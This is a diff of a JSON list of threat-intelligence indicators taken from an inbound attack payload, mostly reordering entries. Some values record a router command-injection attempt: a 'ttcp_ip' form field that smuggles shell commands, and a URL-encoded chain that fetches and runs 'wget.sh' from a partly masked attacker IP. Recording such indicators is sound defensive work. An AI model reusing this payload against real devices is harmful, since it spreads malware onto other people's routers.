@@ -1,9 +1,9 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.169.XXX"
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.lmoon%3Brm%20-f%20.s%60&StartEPI=1"
   },
   {
     "context": "Embedded IP in inbound payload",
@@ -12,22 +12,22 @@
     "value": "91.92.40.XXX"
   },
   {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.lmoon%3Brm%20-f%20.s%60&StartEPI=1"
-  },
-  {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "4453de00e3447f91a656d39395a8b5a62e2585ade8a5340ec532840e68276c5b"
+    "type": "ip",
+    "value": "190.179.169.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h+%60cd%20/tmp%3Brm%20-f%20.s%3Bwget%20ht"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "4453de00e3447f91a656d39395a8b5a62e2585ade8a5340ec532840e68276c5b"
   },
   {
     "asn": "TechTies Inc.",
